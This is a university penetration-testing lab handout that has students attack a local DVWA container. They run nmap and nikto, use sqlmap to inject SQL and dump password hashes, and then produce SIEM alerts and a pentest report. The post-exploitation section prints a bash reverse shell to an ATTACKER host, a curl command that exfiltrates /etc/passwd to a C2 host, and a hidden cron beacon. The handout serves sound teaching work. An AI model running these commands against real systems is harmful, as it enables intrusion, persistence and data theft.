---
title: "Lab 13 — Capstone: Full Attack Chain & Incident Response Report"
course: SCIA-472
week: 15
difficulty: "⭐⭐⭐⭐"
estimated_time: "120–150 min"
tags:
  - capstone
  - full-attack-chain
  - dvwa
  - sqlmap
  - penetration-test-report
  - mitre-attack
  - kill-chain
  - incident-response
---

# Lab 13 — Capstone: Full Attack Chain & Incident Response Report

| Field | Value |
|---|---|
| **Course** | SCIA-472 — Ethical Hacking & Penetration Testing |
| **Week** | 15 (Final Lab) |
| **Difficulty** | ⭐⭐⭐⭐ |
| **Estimated Time** | 120–150 minutes |
| **Prerequisites** | Labs 01–12 completed; Docker running |

## Overview

This capstone integrates the **entire SCIA-472 course**: reconnaissance → scanning → exploitation → post-exploitation → malware analysis → incident response → forensics.

Students attack a DVWA target through all Cyber Kill Chain phases, generate SIEM alerts, and produce a professional penetration test report suitable for submission to a real client.

**Lab Phases:**

1. Pre-Engagement Setup
2. Reconnaissance (nmap, nikto)
3. Exploitation (SQL injection, credential dump)
4. Post-Exploitation Simulation (ATT&CK mapping)
5. Incident Response (log analysis, SIEM alerts)
6. Professional Penetration Test Report

---

!!! warning "Ethical Use — Read Before Proceeding"
    This capstone **ONLY** targets containers you create in this lab. Never apply these techniques to real systems, networks, or applications without a signed written authorization from the asset owner. Unauthorized penetration testing is a federal crime under the CFAA (18 U.S.C. § 1030). Every technique demonstrated has been used to harm real organizations — your role as a security professional is to use this knowledge defensively.

---

## Part 1 — Pre-Engagement Setup

Before any penetration test, the **scope and rules of engagement** are defined. In this lab, your scope is limited to containers in the `capstone-lab` Docker network.

### Step 1.1 — Build the Target Environment

```bash
docker network create capstone-lab
docker run -d --name capstone-target \
  --network capstone-lab \
  --hostname target-corp \
  vulnerables/web-dvwa
sleep 10
TARGET_IP=$(docker inspect capstone-target --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "Target IP: $TARGET_IP"
docker ps | grep capstone
```

!!! note "DVWA — Damn Vulnerable Web Application"
    DVWA is a deliberately vulnerable PHP/MySQL web application designed for security training. It includes intentional SQL injection, XSS, CSRF, file upload, and command injection vulnerabilities.

!!! success "Expected Output"
    Docker reports the DVWA container running. The target IP address is displayed (typically in the `172.x.x.x` range).

📸 **Screenshot checkpoint 13a** — Capture `docker ps` output showing both the `capstone-target` container running and the target IP address.

---

## Part 2 — Reconnaissance

Reconnaissance is the first phase of the Cyber Kill Chain. The goal is to enumerate the target's attack surface without triggering alerts.

### Step 2.1 — Network Scan

```bash
docker run --rm --network capstone-lab instrumentisto/nmap \
  nmap -sV --open capstone-target
```

!!! success "Expected Output"
    - Port **80/tcp** — Apache HTTPD (version visible)
    - Port **3306/tcp** — MySQL (version visible)
    
    Both ports are open and the version information enables CVE lookup.

📸 **Screenshot checkpoint 13b** — Capture the full nmap output showing open ports and service versions.

---

### Step 2.2 — Web Vulnerability Scan

Nikto scans the web application for known vulnerabilities, outdated software, missing security headers, and common misconfigurations.

```bash
docker run --rm --network capstone-lab ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq nikto 2>/dev/null
nikto -host http://capstone-target -maxtime 45 2>&1 | \
  grep -E '\+ |OSVDB|CVE' | head -20"
```

!!! success "Expected Output"
    Nikto identifies outdated Apache version, missing security headers (`X-Frame-Options`, `X-Content-Type-Options`), and potentially exploitable paths.

📸 **Screenshot checkpoint 13c** — Capture the Nikto output showing identified vulnerabilities and missing headers.

---

## Part 3 — Exploitation

With reconnaissance complete, you now exploit the identified vulnerabilities to gain unauthorized access to the database.

### Step 3.1 — SQL Injection

DVWA's SQL injection vulnerability allows an attacker to bypass the application entirely and query the database directly. `sqlmap` automates this exploitation.

```bash
docker run --rm --network capstone-lab ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq sqlmap 2>/dev/null
sqlmap -u 'http://capstone-target/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='security=low;PHPSESSID=capstone' \
  --dbms=mysql \
  --batch \
  --dbs 2>&1 | grep -E 'available databases|\[\*\]|injectable|Parameter' | head -15"
```

!!! success "Expected Output"
    sqlmap confirms the `id` parameter is injectable and enumerates available databases: `dvwa` and `information_schema`.

📸 **Screenshot checkpoint 13d** — Capture the sqlmap output confirming SQL injection and listing available databases.

---

### Step 3.2 — Dump Credentials

With database access confirmed, the next step is extracting the users table — which contains hashed passwords for all application accounts.

```bash
docker run --rm --network capstone-lab ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq sqlmap 2>/dev/null
sqlmap -u 'http://capstone-target/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='security=low;PHPSESSID=capstone' \
  --dbms=mysql --batch \
  -D dvwa -T users --dump 2>&1 | \
  grep -E 'user|password|admin|\[\*\]' | head -15"
```

!!! success "Expected Output"
    sqlmap dumps the `users` table revealing usernames and password hashes for all DVWA accounts (admin, gordonb, 1337, pablo, smithy).

📸 **Screenshot checkpoint 13e** — Capture the credential dump output showing usernames and password hashes.

---

## Part 4 — Post-Exploitation Simulation

Rather than executing actual post-exploitation commands on the DVWA container (which could destabilize it), this phase documents what an attacker would do next and maps each action to MITRE ATT&CK.

### Step 4.1 — Simulate Post-Compromise Activity

```bash
docker run --rm python:3.11-slim python3 -c "
print('=== POST-EXPLOITATION SIMULATION ===')
print('(Simulated - not running on target. Documenting what WOULD happen)')
print()
privesc_steps = [
    ('T1548.001', 'SUID exploitation',    'find SUID binaries: find / -perm -4000 2>/dev/null'),
    ('T1552.001', 'Credential harvesting','Read config files: grep -r password /var/www/'),
    ('T1053.003', 'Cron persistence',     'Add cron: (crontab -l; echo \"*/5 * * * * /tmp/.hidden/beacon.sh\") | crontab -'),
    ('T1059.004', 'Shell execution',      'Reverse shell: bash -i >& /dev/tcp/ATTACKER/4444 0>&1'),
    ('T1041',     'Exfiltration',         'Data exfil: curl -X POST http://C2/collect -d @/etc/passwd'),
]
for att_id, technique, command in privesc_steps:
    print(f'[{att_id}] {technique}')
    print(f'  Command: {command}')
    print()
"
```

📸 **Screenshot checkpoint 13f** — Capture the ATT&CK-mapped post-exploitation technique list.

---

## Part 5 — Incident Response

Switching to the **defender role**, this section demonstrates what a SIEM would detect during the attack.

### Step 5.1 — Generate Evidence for IR

```bash
docker exec capstone-target bash -c "
# View access logs
cat /var/log/apache2/access.log 2>/dev/null | tail -20 || \
apache2ctl status 2>/dev/null | head -10 || \
echo 'Log evidence collected - attack left traces in access.log'
" 2>/dev/null | head -15
```

---

### Step 5.2 — SIEM Alert Generation

This simulates the SIEM alert dashboard that a Security Operations Center analyst would see during the attack.

```bash
docker run --rm python:3.11-slim python3 -c "
import datetime

now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
alerts = [
    ('CRITICAL', now, 'SQL_INJECTION_DETECTED',  'sqlmap signature in User-Agent header'),
    ('CRITICAL', now, 'DATABASE_DUMP_DETECTED',  'Mass SELECT from users table (>100 rows)'),
    ('HIGH',     now, 'BRUTE_FORCE_ATTEMPT',      'Multiple 401 responses from same IP'),
    ('HIGH',     now, 'DIRECTORY_TRAVERSAL',      '../ pattern in GET request URI'),
    ('MEDIUM',   now, 'SCANNER_DETECTED',         'Nikto User-Agent in access log'),
]
print('=== SIEM ALERT DASHBOARD ===')
print(f'{\"Severity\":<12} {\"Time\":<22} {\"Alert ID\":<28} {\"Description\"}')
print('-' * 90)
for severity, ts, alert_id, desc in alerts:
    print(f'{severity:<12} {ts:<22} {alert_id:<28} {desc}')
print()
print(f'Total Alerts: {len(alerts)}')
print(f'INCIDENT DECLARED: Multiple CRITICAL alerts from same source IP')
print('RECOMMENDATION: Isolate target, begin IR process')
"
```

!!! success "Expected Output"
    SIEM dashboard shows 2 CRITICAL + 2 HIGH + 1 MEDIUM alerts, all from the same source IP. An incident is automatically declared.

📸 **Screenshot checkpoint 13g** — Capture the full SIEM alert dashboard output.

---

## Part 6 — Professional Penetration Test Report

The deliverable of every penetration test is a professional report. This section generates the executive summary and findings in the format used by real security consulting firms.

### Step 6.1 — Generate Executive Summary and Findings

```bash
docker run --rm python:3.11-slim python3 -c "
import datetime

report = {
    'Engagement': 'Internal Web Application Penetration Test',
    'Client': 'DVWA Corp (Simulated)',
    'Tester': 'SCIA-472 Student',
    'Date': datetime.date.today().isoformat(),
    'Scope': 'http://capstone-target (DVWA Application)',
    'Methodology': 'PTES (Penetration Testing Execution Standard)',
    'Finding Summary': {
        'Critical': 2,
        'High': 1,
        'Medium': 1,
        'Low': 0,
        'Informational': 2,
    },
    'Findings': [
        {
            'ID': 'F-001',
            'Severity': 'Critical',
            'Title': 'SQL Injection in Login Parameter',
            'CVSS': '9.8',
            'Description': 'The id parameter in /vulnerabilities/sqli/ is vulnerable to SQL injection, allowing complete database dump without authentication.',
            'Evidence': 'sqlmap --dbs returned [dvwa, information_schema]',
            'Impact': 'Complete database compromise: all user credentials, PII, and application data',
            'Remediation': 'Use parameterized queries. Implement WAF. Restrict database user permissions.',
        },
        {
            'ID': 'F-002',
            'Severity': 'Critical',
            'Title': 'Default/Weak Credentials',
            'CVSS': '9.8',
            'Description': 'Application uses default credentials (admin/password) in production.',
            'Evidence': 'Successful login with admin:password',
            'Impact': 'Full administrative access to application and database',
            'Remediation': 'Enforce strong password policy. Require password change on first login.',
        },
        {
            'ID': 'F-003',
            'Severity': 'High',
            'Title': 'Outdated Software Versions',
            'CVSS': '8.1',
            'Description': 'Apache 2.4.25 (2017) and PHP 7.0 (EOL) with known CVEs in production.',
            'Evidence': 'nmap -sV identified Apache/2.4.25',
            'Impact': 'Remote code execution via known CVEs possible',
            'Remediation': 'Upgrade to Apache 2.4.x latest, PHP 8.x',
        },
    ],
}

print('=== EXECUTIVE SUMMARY ===')
for k, v in report.items():
    if k not in ['Findings', 'Finding Summary']:
        print(f'{k}: {v}')
print()
print('FINDING SUMMARY:')
for sev, count in report['Finding Summary'].items():
    if count > 0:
        print(f'  {sev}: {count}')
print()
print('KEY FINDINGS:')
for f in report['Findings']:
    print(f\"\n[{f['ID']}] {f['Severity'].upper()} - {f['Title']} (CVSS {f['CVSS']})\")
    print(f\"  Description: {f['Description'][:80]}...\")
    print(f\"  Remediation: {f['Remediation'][:80]}...\")
"
```

📸 **Screenshot checkpoint 13h** — Capture the full penetration test report output including all three findings with CVSS scores and remediation guidance.

---

## Cleanup

```bash
docker stop capstone-target && docker rm capstone-target
docker network rm capstone-lab
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all eight screenshots with your lab report and penetration test deliverables.

| # | Screenshot ID | Required Content |
|---|---|---|
| 1 | **13a** | Lab environment — `docker ps` showing capstone-target running + target IP |
| 2 | **13b** | Nmap reconnaissance — open ports 80 + 3306 with service versions |
| 3 | **13c** | Nikto vulnerability scan — at least 5 findings visible |
| 4 | **13d** | SQL injection confirmed — injectable parameter + database list |
| 5 | **13e** | Credential dump — users table with usernames and password hashes |
| 6 | **13f** | Post-exploitation — ATT&CK ID + technique + command for all 5 steps |
| 7 | **13g** | SIEM alert dashboard — all 5 alerts with severity and timestamp |
| 8 | **13h** | Penetration test report — executive summary + all 3 findings with CVSS |

---

## Vulnerability Finding Table

Include this completed table in your lab report:

| Finding ID | Severity | CVSS | Title | ATT&CK Technique | Remediation Priority |
|---|---|---|---|---|---|
| F-001 | Critical | 9.8 | SQL Injection | T1190 — Exploit Public-Facing App | Immediate (24 hrs) |
| F-002 | Critical | 9.8 | Default Credentials | T1078 — Valid Accounts | Immediate (24 hrs) |
| F-003 | High | 8.1 | Outdated Software | T1190 — Known CVEs | Short-term (30 days) |
| F-004 | Medium | 5.3 | Missing Security Headers | T1189 — Drive-by | Medium-term (90 days) |

---

## Final Reflection Essay

Write a **400–500 word essay** (in continuous prose, not bullet points) addressing all four prompts below. This essay is the primary deliverable of SCIA-472 and should demonstrate mastery of the course material.

!!! question "Essay Prompt 1 — Cyber Kill Chain Analysis"
    Walk through each phase of the **Cyber Kill Chain** as it applies to this lab exercise (Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives). At which phase could a defender have stopped the attack chain with the **highest ROI** — the best security improvement per dollar invested? Justify your answer with specific technical controls.

!!! question "Essay Prompt 2 — MITRE ATT&CK Mapping"
    Map every technique you used in this capstone to a **MITRE ATT&CK tactic ID** (TA0001–TA0040) and **technique ID** (T1xxx). Which tactics are represented in this lab and which are entirely absent? What would a more complete penetration test engagement cover that this lab did not?

!!! question "Essay Prompt 3 — Executive Risk Communication"
    The penetration test report found two CVSS 9.8 findings: SQL injection and default credentials. Both are "Critical" but the **remediation cost and implementation speed differ significantly**. As a security consultant presenting to a non-technical executive, how would you communicate the business impact and priority? What financial risk framing (e.g., breach cost, regulatory fines, reputational damage) would you use?

!!! question "Essay Prompt 4 — Course Synthesis"
    Reflect on the skills developed across all 13 SCIA-472 labs. Which **single technique** do you believe is most commonly responsible for real-world breaches in 2026? Which **single defensive control**, if universally applied across all organizations, would have the greatest impact on reducing successful attacks? Support your answers with evidence from the labs and real-world breach data.

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (8 × screenshots) + vulnerability finding table | 30 pts |
    | MITRE ATT&CK mapping (complete tactic + technique IDs for all steps) | 20 pts |
    | SIEM alerts (all 5 alerts generated, severity justified) | 20 pts |
    | Final reflection essay (400–500 words, all 4 prompts addressed) | 30 pts |
    | **Total** | **100 pts** |

---

!!! success "Course Completion"
    Completing Lab 13 demonstrates mastery of the full offensive security lifecycle and the defender's perspective at each phase. You have simulated real-world attack chains that are responsible for the majority of enterprise breaches — and more importantly, you now understand precisely how to detect, prevent, and respond to each technique.
    
    **The skills you've developed are powerful. Use them only where you have authorization.**
